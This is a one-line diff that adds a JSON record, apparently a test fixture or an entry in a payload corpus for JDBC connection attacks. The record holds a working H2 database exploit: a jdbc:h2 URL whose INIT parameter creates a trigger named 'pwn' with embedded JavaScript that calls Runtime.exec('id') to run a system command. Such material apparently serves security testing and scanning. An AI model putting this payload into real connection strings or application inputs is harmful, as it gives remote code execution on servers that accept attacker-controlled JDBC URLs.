@@ -1,0 +1,1 @@
+{"attack_type":"jdbc_connection","driver":"h2","driver_class":"org.h2.Driver","jdbc_url":"jdbc:h2:mem:test","url_params":{"INIT":"CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('id')$$"},"credentials":{"user":"sa","password":""},"pool":"","pool_config":{},"sql_payload":"","deser_properties":{}}
